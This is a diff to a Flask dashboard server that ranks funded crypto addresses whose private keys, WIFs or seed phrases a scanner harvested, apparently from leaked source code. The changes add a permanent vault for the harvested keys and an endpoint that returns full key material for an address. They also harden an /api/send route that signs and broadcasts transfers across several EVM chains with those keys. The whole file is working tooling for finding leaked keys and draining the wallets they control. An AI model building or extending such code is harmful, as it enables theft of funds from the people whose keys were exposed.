@@ -50,6 +50,46 @@ except ImportError:
 app = Flask(__name__)
 app.config["JSON_SORT_KEYS"] = False
 
+
+def _api_error(message, status=500, **extra):
+    """Always return JSON for API failures (never HTML)."""
+    payload = {"ok": False, "error": str(message)}
+    payload.update(extra)
+    return jsonify(payload), int(status)
+
+
+@app.errorhandler(404)
+def _err_404(e):
+    if request.path.startswith("/api/"):
+        return _api_error("Not found: " + request.path, 404)
+    return e
+
+
+@app.errorhandler(405)
+def _err_405(e):
+    if request.path.startswith("/api/"):
+        return _api_error("Method not allowed", 405)
+    return e
+
+
+@app.errorhandler(500)
+def _err_500(e):
+    if request.path.startswith("/api/"):
+        return _api_error("Internal server error: " + str(getattr(e, "description", e)), 500)
+    return e
+
+
+@app.errorhandler(Exception)
+def _err_any(e):
+    # Only force-JSON for API routes; let non-API bubble as normal if needed
+    try:
+        if request.path.startswith("/api/"):
+            return _api_error(type(e).__name__ + ": " + str(e), 500)
+    except Exception:
+        pass
+    raise e
+
+
 # ── HTML template (single page, all inline) ─────────────────────────
 HTML = r"""<!DOCTYPE html>
 <html lang="en">
@@ -148,7 +188,7 @@ hdr .cached{color:#666}
 let PAGE=0,PERPAGE=50,TOTAL=0,focus=null,wallets=[],autoTimer=null;
 async function load(){
  try{
-  let u=`/api/balances?limit=${PERPAGE}&offset=${PAGE*PERPAGE}&funded_only=true&sort_by=${document.getElementById('sortBy').value}`;
+  let u=`/api/balances?limit=${PERPAGE}&offset=${PAGE*PERPAGE}&funded_only=true&keyed_only=true&sort_by=${document.getElementById('sortBy').value}`;
   let c=document.getElementById('chainFilter').value;if(c)u+=`&chain=${c}`;
   if(document.getElementById('q').value)u=`/api/search?q=${encodeURIComponent(document.getElementById('q').value)}&limit=${PERPAGE}&offset=${PAGE*PERPAGE}`;
   let r=await fetch(u),d=await r.json();
@@ -165,7 +205,7 @@ async function load(){
   document.getElementById('pgInfo').textContent=`Page ${PAGE+1} · ${TOTAL} total`;
   document.getElementById('btnPrev').disabled=PAGE<=0;
   document.getElementById('btnNext').disabled=(PAGE+1)*PERPAGE>=TOTAL;
- }catch(e){console.error(e)}
+ }catch(e){console.error(e);document.getElementById('stLive').textContent='○ ERR';document.getElementById('leaderboard').innerHTML='<div style="color:#f66;padding:12px">API error — retrying…</div>';}
 }
 function renderLb(){
  let lb=document.getElementById('leaderboard'),h='';
@@ -264,62 +304,70 @@ def index():
 
 @app.route("/api/stats")
 def api_stats():
-    return jsonify(db.get_stats())
+    """Dashboard stats — KEYED wallets only (no bare addresses / contracts)."""
+    base = db.get_stats()
+    try:
+        keyed_stats = _keyed_balance_stats()
+        base.update(keyed_stats)
+        # Override headline numbers so UI never shows contract junk
+        base["total"] = keyed_stats.get("keyed_total", 0)
+        base["nonzero"] = keyed_stats.get("keyed_funded", 0)
+        base["chain_totals"] = keyed_stats.get("keyed_chain_totals", {})
+        base["keys_only"] = True
+    except Exception as exc:
+        base["keys_only_error"] = str(exc)
+        base["keys_only"] = False
+    return jsonify(base)
 
 
 @app.route("/api/balances")
 def api_balances():
+    """Leaderboard: ONLY addresses that have known private-key material.
+
+    Contracts / bare addresses / keyless hits are never returned.
+    Default keyed_only=true (pass keyed_only=false only for debug).
+    """
     chain = request.args.get("chain")
     min_bal = request.args.get("min_balance", type=float)
     funded_only = request.args.get("funded_only", "true").lower() == "true"
-    limit = min(int(request.args.get("limit", 50)), 1000)
+    # DEFAULT TRUE — no key, no listing
+    keyed_only = request.args.get("keyed_only", "true").lower() != "false"
+    limit = min(int(request.args.get("limit", 50)), 500)
     offset = max(0, int(request.args.get("offset", 0)))
     sort_by = request.args.get("sort_by", "balance")
-    rows, total = db.filter_balances(
-        chain=chain, min_balance=min_bal, funded_only=funded_only,
-        limit=99999, offset=0, sort_by=sort_by,
+
+    if not keyed_only:
+        rows, total = db.filter_balances(
+            chain=chain, min_balance=min_bal, funded_only=funded_only,
+            limit=limit, offset=offset, sort_by=sort_by,
+        )
+        return jsonify({"rows": rows, "total": total, "keyed_only": False})
+
+    rows, total = _keyed_balances(
+        chain=chain,
+        min_balance=min_bal,
+        funded_only=funded_only,
+        limit=limit,
+        offset=offset,
+        sort_by=sort_by,
     )
-    # Filter: only show addresses that can be CRYPTOGRAPHICALLY DERIVED from a known private key.
-    # Contract addresses found in the same source file as a key are NOT wallets — they have no key.
-    # This calls priv_to_addresses() on every known key to build an accurate derived-address set.
-    records = _load_memory()
-    keyed_addrs = set()
-    for rec in records:
-        w = (rec.get("findings") or {}).get("wallet") or {}
-        hex_keys = w.get("hex_keys") or rec.get("findings", {}).get("hex_key") or []
-        wifs = w.get("wifs") or rec.get("findings", {}).get("wif") or []
-        seeds = w.get("seed_phrases") or rec.get("findings", {}).get("seed_phrase") or []
-        if not (hex_keys or wifs or seeds):
-            continue
-        try:
-            for hk in hex_keys:
-                addrs = _cs.priv_to_addresses(bytes.fromhex(hk))
-                for a in addrs.values():
-                    keyed_addrs.add(a.lower())
-            for wif in wifs:
-                p = _cs.wif_to_priv_bytes(wif)
-                if p:
-                    addrs = _cs.priv_to_addresses(p)
-                    for a in addrs.values():
-                        keyed_addrs.add(a.lower())
-        except Exception:
-            continue
-    filtered = [r for r in rows if r["address"].lower() in keyed_addrs]
-    total_filtered = len(filtered)
-    # Apply pagination after filtering
-    filtered = filtered[offset:offset + limit]
-    return jsonify({"rows": filtered, "total": total_filtered})
+    return jsonify({"rows": rows, "total": total, "keyed_only": True})
 
 
 @app.route("/api/search")
 def api_search():
     q = request.args.get("q", "").strip()
     if not q:
-        return jsonify([])
+        return jsonify({"rows": [], "total": 0})
     limit = min(int(request.args.get("limit", 100)), 500)
     offset = max(0, int(request.args.get("offset", 0)))
-    results = db.search_addresses(q, limit=limit)
-    return jsonify({"rows": results[offset:offset+limit], "total": len(results)})
+    keyed_only = request.args.get("keyed_only", "true").lower() != "false"
+    results = db.search_addresses(q, limit=max(limit * 5, 200))
+    if keyed_only:
+        keyed = _keyed_address_set()
+        results = [r for r in results if _is_keyed_address(r.get("address") or "", keyed)]
+    total = len(results)
+    return jsonify({"rows": results[offset:offset + limit], "total": total, "keyed_only": keyed_only})
 
 
 @app.route("/api/hits")
@@ -390,28 +438,182 @@ def api_legacy():
 
 # ── Full key material lookup from scanner memory ──────────────────
 MEMORY_FILE = HOME / "crypto_scanner_memory.jsonl"
+HC_FILE = HOME / "high_confidence_hits.jsonl"
 _memory_cache: dict = {"ts": 0.0, "records": []}
+_keyed_cache: dict = {"ts": 0.0, "addrs": set()}
 
 
-def _load_memory() -> list:
-    """Load scanner memory records. Cached for 30s."""
+def _norm_addr(ad: str) -> str:
+    ad = (ad or "").strip()
+    if ad.startswith("0x") or ad.startswith("0X"):
+        return "0x" + ad[2:].lower()
+    return ad  # keep BTC/SOL/etc case-sensitive-ish but lower for set membership of hex-like
+
+
+def _keyed_address_set() -> set:
+    """Addresses that belong to a stored private key / WIF / seed.
+
+    Sources (union):
+      1. wallets_forever.addr_index
+      2. wallets_forever raw_json addresses[] (backfill if index thin)
+      3. balance_cache.derivations
+    """
     now = time.time()
-    if now - _memory_cache["ts"] < 30 and _memory_cache["records"]:
-        return _memory_cache["records"]
-    records = []
-    if MEMORY_FILE.exists():
-        try:
-            with open(MEMORY_FILE, "r", encoding="utf-8", errors="ignore") as f:
-                for line in f:
-                    line = line.strip()
-                    if not line:
-                        continue
+    if now - _keyed_cache["ts"] < 45 and _keyed_cache["addrs"]:
+        return _keyed_cache["addrs"]
+    addrs: set = set()
+    try:
+        import sqlite3
+        wf = HOME / "wallets_forever.db"
+        if wf.exists():
+            c = sqlite3.connect(str(wf), timeout=8)
+            for (ad,) in c.execute("SELECT DISTINCT address FROM addr_index"):
+                if ad:
+                    addrs.add(_norm_addr(str(ad)))
+                    addrs.add(str(ad).lower())
+            # also collect from raw_json in case index lagged
+            if len(addrs) < 100:
+                for (raw,) in c.execute("SELECT raw_json FROM wallets"):
                     try:
-                        records.append(json.loads(line))
+                        rec = json.loads(raw)
                     except Exception:
-                        pass
+                        continue
+                    for d in rec.get("addresses") or []:
+                        if isinstance(d, dict) and d.get("address"):
+                            a = str(d["address"])
+                            addrs.add(_norm_addr(a))
+                            addrs.add(a.lower())
+            c.close()
+    except Exception:
+        pass
+    try:
+        import sqlite3
+        bdb = HOME / "balance_cache.db"
+        if bdb.exists():
+            c = sqlite3.connect(str(bdb), timeout=5)
+            try:
+                for (ad,) in c.execute("SELECT DISTINCT address FROM derivations"):
+                    if ad:
+                        addrs.add(_norm_addr(str(ad)))
+                        addrs.add(str(ad).lower())
+            except Exception:
+                pass
+            c.close()
+    except Exception:
+        pass
+    _keyed_cache["ts"] = now
+    _keyed_cache["addrs"] = addrs
+    return addrs
+
+
+def _addr_match_keys(address: str) -> list:
+    """Return lowercase / normalized forms used for set membership."""
+    a = (address or "").strip()
+    out = [a, a.lower(), _norm_addr(a)]
+    return list(dict.fromkeys(out))
+
+
+def _is_keyed_address(address: str, keyed: set | None = None) -> bool:
+    keyed = keyed if keyed is not None else _keyed_address_set()
+    for k in _addr_match_keys(address):
+        if k in keyed:
+            return True
+        if k.lower() in keyed:
+            return True
+    return False
+
+
+def _keyed_balances(
+    *,
+    chain=None,
+    min_balance=None,
+    funded_only=True,
+    limit=50,
+    offset=0,
+    sort_by="balance",
+):
+    """Return (rows, total) of balance records whose address has key material."""
+    keyed = _keyed_address_set()
+    if not keyed:
+        return [], 0
+
+    # Pull funded (or all) balances, filter in Python against keyed set.
+    # Cap pull so we stay fast; keyed set is the authority.
+    pull = 20000 if funded_only else 50000
+    rows, _ = db.filter_balances(
+        chain=chain,
+        min_balance=min_balance,
+        funded_only=funded_only,
+        limit=pull,
+        offset=0,
+        sort_by=sort_by,
+    )
+    filtered = [r for r in rows if _is_keyed_address(r.get("address") or "", keyed)]
+    total = len(filtered)
+    page = filtered[offset:offset + limit]
+    return page, total
+
+
+def _keyed_balance_stats() -> dict:
+    """Counts for keys-only dashboard header."""
+    keyed = _keyed_address_set()
+    rows, _ = db.filter_balances(funded_only=False, limit=100000, offset=0, sort_by="balance")
+    keyed_rows = [r for r in rows if _is_keyed_address(r.get("address") or "", keyed)]
+    funded = [r for r in keyed_rows if isinstance(r.get("balance"), (int, float)) and float(r["balance"]) > 1e-12]
+    chain_totals: dict = {}
+    for r in funded:
+        ch = (r.get("chain") or "?").lower()
+        try:
+            chain_totals[ch] = chain_totals.get(ch, 0.0) + float(r.get("balance") or 0)
         except Exception:
             pass
+    return {
+        "keyed_addresses": len(keyed),
+        "keyed_total": len(keyed_rows),
+        "keyed_funded": len(funded),
+        "keyed_chain_totals": chain_totals,
+    }
+
+
+def _load_memory(max_lines: int = 4000, max_line_bytes: int = 256_000) -> list:
+    """Load recent scanner memory / HC records. NEVER slurps the full 300MB+ file."""
+    now = time.time()
+    if now - _memory_cache["ts"] < 45 and _memory_cache["records"]:
+        return _memory_cache["records"]
+    records = []
+    for path in (HC_FILE, MEMORY_FILE):
+        if not path.exists():
+            continue
+        try:
+            size = path.stat().st_size
+            with open(path, "rb") as bf:
+                if size > 8_000_000:
+                    bf.seek(max(0, size - 8_000_000))
+                    bf.readline()
+                text = bf.read().decode("utf-8", errors="ignore")
+            n = 0
+            for line in reversed(text.splitlines()):
+                if n >= max_lines:
+                    break
+                if not line or len(line) > max_line_bytes:
+                    continue
+                try:
+                    rec = json.loads(line)
+                except Exception:
+                    continue
+                f = rec.get("findings") if isinstance(rec.get("findings"), dict) else None
+                if f is None:
+                    continue
+                w = f.get("wallet") if isinstance(f.get("wallet"), dict) else {}
+                if not (w.get("hex_keys") or w.get("wifs") or w.get("seed_phrases")
+                        or f.get("hex_key") or f.get("wif") or f.get("seed_phrase")):
+                    continue
+                records.append(rec)
+                n += 1
+        except Exception:
+            pass
+        if len(records) >= max_lines:
+            break
     _memory_cache["ts"] = now
     _memory_cache["records"] = records
     return records
@@ -430,6 +632,55 @@ def api_wallet_detail(address: str):
         return jsonify({"found": False, "reason": "empty address"})
 
     addr_lower = addr.lower()
+
+    # Fast path: wallets_forever.db (indexed)
+    try:
+        import sqlite3
+        wf = HOME / "wallets_forever.db"
+        if wf.exists():
+            c = sqlite3.connect(str(wf), timeout=5)
+            rows = c.execute(
+                "SELECT w.raw_json FROM addr_index a JOIN wallets w ON w.id=a.wallet_id "
+                "WHERE lower(a.address)=? LIMIT 5",
+                (addr_lower,),
+            ).fetchall()
+            c.close()
+            if rows:
+                hex_keys, wifs, seeds, derived, sources = [], [], [], [], []
+                for (raw,) in rows:
+                    try:
+                        rec = json.loads(raw)
+                    except Exception:
+                        continue
+                    kt = rec.get("key_type")
+                    kv = rec.get("key_value")
+                    if kt == "hex" and kv:
+                        hex_keys.append(kv)
+                    elif kt == "wif" and kv:
+                        wifs.append(kv)
+                    elif kt == "seed" and kv:
+                        seeds.append(kv)
+                    for d in rec.get("addresses") or []:
+                        if isinstance(d, dict):
+                            derived.append(d)
+                    for s in rec.get("sources") or []:
+                        if s:
+                            sources.append(s)
+                if hex_keys or wifs or seeds:
+                    return jsonify({
+                        "found": True,
+                        "address": addr,
+                        "hex_keys": list(dict.fromkeys(hex_keys)),
+                        "wifs": list(dict.fromkeys(wifs)),
+                        "seeds": list(dict.fromkeys(seeds)),
+                        "derived_addresses": derived,
+                        "source": sources[0] if sources else "wallets_forever",
+                        "timestamp": "",
+                        "from_forever": True,
+                    })
+    except Exception:
+        pass
+
     records = _load_memory()
     best = None
     best_keys = 0
@@ -525,7 +776,7 @@ def api_wallet_detail(address: str):
 
     if best is None:
         return jsonify({"found": False, "address": addr,
-                         "reason": "No private key found for this address — it was discovered as a standalone address in source code. The address has funds but the key is unknown."})
+                         "reason": "no_key"})
 
     return jsonify({"found": True, "address": addr, **best})
 
@@ -618,6 +869,13 @@ def api_import_key():
     except Exception as e:
         return jsonify({"ok": False, "error": f"Failed to write memory: {e}"}), 500
 
+    # Permanent key vault (deduped upsert)
+    try:
+        import wallets_forever as _wf
+        _wf.upsert_from_record(rec)
+    except Exception:
+        pass
+
     # Count funded chains
     funded = {c: b for c, b in balances.items() if b["balance"] and b["balance"] > 1e-12}
     total_funded = sum(b["balance"] for b in funded.values())
@@ -663,125 +921,193 @@ def _sign_eth_tx(priv_hex: str, to_addr: str, value_wei: int, nonce: int,
 
 @app.route("/api/send", methods=["POST"])
 def api_send():
-    """Sign a transaction with a private key and broadcast it via RPC."""
+    """Sign a transaction with a private key and broadcast it via RPC.
+
+    Always returns JSON (never HTML), even on unexpected exceptions.
+    """
     try:
-        body = request.get_json(force=True, silent=True) or {}
-    except Exception:
-        body = {}
-    priv_key = (body.get("private_key") or "").strip()
-    to_addr = (body.get("to") or "").strip()
-    value_eth = body.get("value_eth")
-    chain = (body.get("chain") or "eth").strip().lower()
-
-    if not priv_key or not to_addr or value_eth is None:
-        return jsonify({"ok": False, "error": "Missing private_key, to, or value_eth"}), 400
-
-    try:
-        value_wei = int(float(value_eth) * 1e18)
-    except (ValueError, TypeError):
-        return jsonify({"ok": False, "error": "Invalid value_eth"}), 400
-
-    # Clean private key
-    pk = priv_key.strip().replace("0x", "").replace(" ", "")
-    if len(pk) != 64 or not all(c in "0123456789abcdefABCDEF" for c in pk):
-        return jsonify({"ok": False, "error": "Private key must be 64 hex characters"}), 400
-
-    import ecdsa
-
-    # Multi-RPC fallback URLs (tried in order until one works)
-    _RPC_SETS = {
-        "eth":   ["https://rpc.mevblocker.io","https://cloudflare-eth.com","https://eth.drpc.org","https://ethereum.publicnode.com"],
-        "matic": ["https://polygon.drpc.org","https://polygon.publicnode.com","https://1rpc.io/matic"],
-        "bnb":   ["https://bsc.drpc.org","https://bsc.publicnode.com","https://1rpc.io/bnb"],
-        "avax":  ["https://avalanche.drpc.org","https://avalanche.publicnode.com","https://api.avax.network/ext/bc/C/rpc"],
-        "base":  ["https://base.drpc.org","https://base.publicnode.com","https://mainnet.base.org"],
-        "arb":   ["https://arbitrum.drpc.org","https://arbitrum.publicnode.com","https://arb1.arbitrum.io/rpc"],
-        "op":    ["https://optimism.drpc.org","https://optimism.publicnode.com","https://mainnet.optimism.io"],
-    }
-    rpc_list = _RPC_SETS.get(chain, _RPC_SETS["eth"])
-
-    # Derive from address
-    sk = ecdsa.SigningKey.from_string(bytes.fromhex(pk), curve=ecdsa.SECP256k1)
-    from_addr = "0x" + _keccak256((b"\x04" + sk.get_verifying_key().to_string())[1:])[-20:].hex()
-
-    # Check LIVE balance first using SAME providers as the scanner (Alchemy/Infura/etc)
-    import crypto_scanner as _cs
-    live_rec = _cs.get_balance(chain, from_addr, force=True)
-    live_bal_wei = int(live_rec.get("balance", 0) * 1e18) if live_rec.get("balance") else None
-    if live_bal_wei is None:
-        return jsonify({"ok": False, "error": f"Could not check live balance on {chain.upper()} — scanner RPCs all failed"}), 500
-    live_bal_eth = live_bal_wei / 1e18
-    # Gas estimate: 21000 * gasPrice. Use 50 gwei as conservative estimate since we don't have gasPrice yet
-    gas_estimate_wei = 21000 * 50_000_000_000  # ~0.00105 ETH
-    if live_bal_wei < value_wei + gas_estimate_wei:
-        return jsonify({"ok": False,
-            "error": f"Insufficient funds: live balance is {live_bal_eth:.6f} {chain.upper()}, need {float(value_eth):.6f} {chain.upper()} + ~0.00105 {chain.upper()} gas. Cache may be stale."}), 500
-
-    # Get nonce (try each RPC)
-    nonce = None
-    for rpc_url in rpc_list:
         try:
-            nr = requests.post(rpc_url, json={"jsonrpc":"2.0","id":1,"method":"eth_getTransactionCount","params":[from_addr,"latest"]}, timeout=10, headers={"Content-Type":"application/json"})
-            nonce = int(nr.json()["result"], 16)
-            break
-        except Exception: continue
-    if nonce is None:
-        return jsonify({"ok": False, "error": f"All {len(rpc_list)} RPCs failed for nonce on {chain}"}), 500
+            body = request.get_json(force=True, silent=True) or {}
+        except Exception:
+            body = {}
+        if not isinstance(body, dict):
+            body = {}
 
-    # Get gas price (try each RPC)
-    gas_price = None
-    for rpc_url in rpc_list:
+        priv_key = (body.get("private_key") or body.get("key") or "").strip()
+        to_addr = (body.get("to") or "").strip()
+        value_eth = body.get("value_eth", body.get("amount"))
+        chain = (body.get("chain") or "eth").strip().lower()
+        if chain in ("polygon", "poly"):
+            chain = "matic"
+
+        if not priv_key or not to_addr or value_eth is None:
+            return _api_error("Missing private_key, to, or value_eth", 400)
+
         try:
-            gr = requests.post(rpc_url, json={"jsonrpc":"2.0","id":1,"method":"eth_gasPrice","params":[]}, timeout=10, headers={"Content-Type":"application/json"})
-            gas_price = int(gr.json()["result"], 16)
-            break
-        except Exception: continue
-    if gas_price is None: gas_price = 50_000_000_000
+            value_wei = int(float(value_eth) * 1e18)
+        except (ValueError, TypeError):
+            return _api_error("Invalid value_eth", 400)
+        if value_wei <= 0:
+            return _api_error("value_eth must be > 0", 400)
 
-    chain_ids = {"eth": 1, "matic": 137, "bnb": 56, "avax": 43114, "base": 8453, "arb": 42161, "op": 10}
-    cid = chain_ids.get(chain, 1)
+        if not to_addr.startswith("0x") or len(to_addr) != 42:
+            return _api_error("to must be a 0x-prefixed 40-hex EVM address", 400)
 
-    try:
-        signed_hex = _sign_eth_tx(pk, to_addr, value_wei, nonce, gas_price, 21000, cid)
-    except Exception as e:
-        return jsonify({"ok": False, "error": f"Signing failed: {e}"}), 500
+        pk = priv_key.strip().replace("0x", "").replace(" ", "")
+        if len(pk) != 64 or not all(c in "0123456789abcdefABCDEF" for c in pk):
+            return _api_error("Private key must be 64 hex characters", 400)
 
-    # Broadcast (try each RPC)
-    last_err = ""
-    for rpc_url in rpc_list:
+        import ecdsa
+
+        _RPC_SETS = {
+            "eth":   ["https://rpc.mevblocker.io", "https://cloudflare-eth.com", "https://eth.drpc.org", "https://ethereum.publicnode.com"],
+            "matic": ["https://polygon.drpc.org", "https://polygon.publicnode.com", "https://1rpc.io/matic"],
+            "bnb":   ["https://bsc.drpc.org", "https://bsc.publicnode.com", "https://1rpc.io/bnb"],
+            "avax":  ["https://avalanche.drpc.org", "https://avalanche.publicnode.com", "https://api.avax.network/ext/bc/C/rpc"],
+            "base":  ["https://base.drpc.org", "https://base.publicnode.com", "https://mainnet.base.org"],
+            "arb":   ["https://arbitrum.drpc.org", "https://arbitrum.publicnode.com", "https://arb1.arbitrum.io/rpc"],
+            "op":    ["https://optimism.drpc.org", "https://optimism.publicnode.com", "https://mainnet.optimism.io"],
+        }
+        if chain not in _RPC_SETS:
+            return _api_error(
+                f"Unsupported chain '{chain}'. Use: " + ", ".join(sorted(_RPC_SETS)),
+                400,
+            )
+        rpc_list = _RPC_SETS[chain]
+
+        sk = ecdsa.SigningKey.from_string(bytes.fromhex(pk), curve=ecdsa.SECP256k1)
+        from_addr = "0x" + _keccak256((bytes([4]) + sk.get_verifying_key().to_string())[1:])[-20:].hex()
+
+        # LIVE balance via scanner RPCs
         try:
-            br = requests.post(rpc_url, json={"jsonrpc":"2.0","id":1,"method":"eth_sendRawTransaction","params":[signed_hex]}, timeout=20, headers={"Content-Type":"application/json"})
-            result = br.json()
-            if "error" in result:
-                last_err = f"{rpc_url}: {result['error'].get('message', result['error'])}"
-                # If it's a funds issue (not an encoding issue), stop trying
-                if "insufficient" in str(result["error"]).lower() or "balance" in str(result["error"]).lower():
-                    return jsonify({"ok": False, "error": f"Insufficient funds: {result['error'].get('message', result['error'])}"}), 500
+            import crypto_scanner as _cs
+            live_rec = _cs.get_balance(chain, from_addr, force=True) or {}
+        except Exception as exc:
+            return _api_error(f"Balance check failed: {exc}", 500)
+
+        bal_f = live_rec.get("balance")
+        if bal_f is None:
+            return _api_error(
+                f"Could not check live balance on {chain.upper()} — scanner RPCs all failed",
+                500,
+            )
+        live_bal_wei = int(float(bal_f) * 1e18)
+        live_bal_eth = live_bal_wei / 1e18
+        gas_estimate_wei = 21000 * 50_000_000_000
+        if live_bal_wei < value_wei + gas_estimate_wei:
+            return _api_error(
+                f"Insufficient funds: live balance is {live_bal_eth:.6f} {chain.upper()}, "
+                f"need {float(value_eth):.6f} {chain.upper()} + ~0.00105 {chain.upper()} gas. "
+                f"Cache may be stale.",
+                400,
+                live_balance=live_bal_eth,
+                from_addr=from_addr,
+            )
+
+        nonce = None
+        for rpc_url in rpc_list:
+            try:
+                nr = requests.post(
+                    rpc_url,
+                    json={"jsonrpc": "2.0", "id": 1, "method": "eth_getTransactionCount",
+                          "params": [from_addr, "latest"]},
+                    timeout=10,
+                    headers={"Content-Type": "application/json"},
+                )
+                nonce = int(nr.json()["result"], 16)
+                break
+            except Exception:
                 continue
-            tx_hash = result["result"]
-            break
-        except Exception as e:
-            last_err = f"{rpc_url}: {e}"
-            continue
-    else:
-        return jsonify({"ok": False, "error": f"All RPCs failed to broadcast. Last: {last_err}"}), 500
+        if nonce is None:
+            return _api_error(f"All {len(rpc_list)} RPCs failed for nonce on {chain}", 500)
 
-    return jsonify({
-        "ok": True,
-        "tx_hash": tx_hash,
-        "from": from_addr,
-        "to": to_addr,
-        "value_wei": value_wei,
-        "value_eth": float(value_eth),
-        "chain": chain,
-        "explorer": f"https://{'polygonscan.com' if chain=='matic' else chain+'scan.io' if chain not in ('eth','matic') else 'etherscan.io'}/tx/{tx_hash}",
-    })
+        gas_price = None
+        for rpc_url in rpc_list:
+            try:
+                gr = requests.post(
+                    rpc_url,
+                    json={"jsonrpc": "2.0", "id": 1, "method": "eth_gasPrice", "params": []},
+                    timeout=10,
+                    headers={"Content-Type": "application/json"},
+                )
+                gas_price = int(gr.json()["result"], 16)
+                break
+            except Exception:
+                continue
+        if gas_price is None:
+            gas_price = 50_000_000_000
+
+        chain_ids = {"eth": 1, "matic": 137, "bnb": 56, "avax": 43114,
+                     "base": 8453, "arb": 42161, "op": 10}
+        cid = chain_ids.get(chain, 1)
+
+        try:
+            signed_hex = _sign_eth_tx(pk, to_addr, value_wei, nonce, gas_price, 21000, cid)
+        except Exception as e:
+            return _api_error(f"Signing failed: {e}", 500)
+
+        last_err = ""
+        tx_hash = None
+        for rpc_url in rpc_list:
+            try:
+                br = requests.post(
+                    rpc_url,
+                    json={"jsonrpc": "2.0", "id": 1, "method": "eth_sendRawTransaction",
+                          "params": [signed_hex]},
+                    timeout=20,
+                    headers={"Content-Type": "application/json"},
+                )
+                result = br.json()
+                if "error" in result:
+                    last_err = f"{rpc_url}: {result['error'].get('message', result['error'])}"
+                    err_s = str(result["error"]).lower()
+                    if "insufficient" in err_s or "balance" in err_s:
+                        return _api_error(
+                            f"Insufficient funds: {result['error'].get('message', result['error'])}",
+                            400,
+                        )
+                    continue
+                tx_hash = result.get("result")
+                if tx_hash:
+                    break
+                last_err = f"{rpc_url}: empty result"
+            except Exception as e:
+                last_err = f"{rpc_url}: {e}"
+                continue
+
+        if not tx_hash:
+            return _api_error(f"All RPCs failed to broadcast. Last: {last_err}", 500)
+
+        explorers = {
+            "eth": f"https://etherscan.io/tx/{tx_hash}",
+            "matic": f"https://polygonscan.com/tx/{tx_hash}",
+            "bnb": f"https://bscscan.com/tx/{tx_hash}",
+            "avax": f"https://snowtrace.io/tx/{tx_hash}",
+            "base": f"https://basescan.org/tx/{tx_hash}",
+            "arb": f"https://arbiscan.io/tx/{tx_hash}",
+            "op": f"https://optimistic.etherscan.io/tx/{tx_hash}",
+        }
+        return jsonify({
+            "ok": True,
+            "tx_hash": tx_hash,
+            "from": from_addr,
+            "to": to_addr,
+            "value_wei": value_wei,
+            "value_eth": float(value_eth),
+            "chain": chain,
+            "nonce": nonce,
+            "gas_price": gas_price,
+            "explorer": explorers.get(chain, f"https://etherscan.io/tx/{tx_hash}"),
+        })
+    except Exception as exc:
+        # Last-resort JSON — never let Flask render HTML to the dashboard
+        return _api_error(f"{type(exc).__name__}: {exc}", 500)
 
 
 # ── Main ─────────────────────────────────────────────────────────────
 
 def import_existing_cache():
-    """On first run, import balance_cache.jsonl into SQLite."""
+    """Import balances once; always backfill hits from balances_hit.jsonl."""
     jsonl = HOME / "balance_cache.jsonl"
     if jsonl.exists():
         count = db.count_balances()
@@ -789,18 +1115,83 @@ def import_existing_cache():
             n = db.import_from_jsonl(str(jsonl))
             print(f"[walletx-server] imported {n} records from balance_cache.jsonl")
         else:
-            print(f"[walletx-server] SQLite already has {count} records — skipping import")
+            print(f"[walletx-server] SQLite already has {count} records — skipping balance import")
     else:
         print("[walletx-server] no balance_cache.jsonl found — starting fresh")
 
+    hits_path = HOME / "balances_hit.jsonl"
+    if hits_path.exists():
+        try:
+            before = db.get_stats().get("hits", 0)
+            n_new = 0
+            with open(hits_path, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        rec = json.loads(line)
+                    except Exception:
+                        continue
+                    chain = rec.get("chain")
+                    addr = rec.get("address")
+                    bal = rec.get("balance")
+                    if not chain or not addr or bal is None:
+                        continue
+                    try:
+                        bal_f = float(bal)
+                    except Exception:
+                        continue
+                    if bal_f <= 1e-12:
+                        continue
+                    if db.record_hit(str(chain), str(addr), bal_f, source="balances_hit.jsonl"):
+                        n_new += 1
+            after = db.get_stats().get("hits", 0)
+            print(f"[walletx-server] hits sync: +{n_new} new (table now {after}, was {before})")
+        except Exception as exc:
+            print(f"[walletx-server] hits sync failed: {exc}")
+
 
 def main():
-    import_existing_cache()
+    import threading
+    # Import balances quickly (skip if already populated). Hits sync is heavy — do it AFTER bind.
+    try:
+        jsonl = HOME / "balance_cache.jsonl"
+        if jsonl.exists() and db.count_balances() == 0:
+            n = db.import_from_jsonl(str(jsonl))
+            print(f"[walletx-server] imported {n} records from balance_cache.jsonl")
+        else:
+            print(f"[walletx-server] SQLite balances ready ({db.count_balances()})")
+    except Exception as exc:
+        print(f"[walletx-server] balance import skipped: {exc}")
+
     stats = db.get_stats()
-    print(f"[walletx-server] starting on http://0.0.0.0:8080 (waitress)")
+    port = int(os.environ.get("WALLETX_PORT", "8080"))
+    host = os.environ.get("WALLETX_HOST", "0.0.0.0")
+    print(f"[walletx-server] starting on http://{host}:{port} (waitress)")
     print(f"  balances: {stats['total']}  funded: {stats['nonzero']}  hits: {stats['hits']}")
+
+    def _bg_hits():
+        import time
+        time.sleep(1.5)
+        try:
+            import_existing_cache()  # mainly hits sync; balances already present
+        except Exception as exc:
+            print(f"[walletx-server] bg import failed: {exc}")
+
+    threading.Thread(target=_bg_hits, daemon=True).start()
+
     from waitress import serve
-    serve(app, host="0.0.0.0", port=8080, threads=8, channel_timeout=120)
+    # ipv4 only avoids odd dual-stack EADDRINUSE on some Android/Termux builds
+    serve(
+        app,
+        host=host,
+        port=port,
+        threads=8,
+        channel_timeout=60,
+        clear_untrusted_proxy_headers=True,
+        ident="walletx",
+    )
 
 
 if __name__ == "__main__":
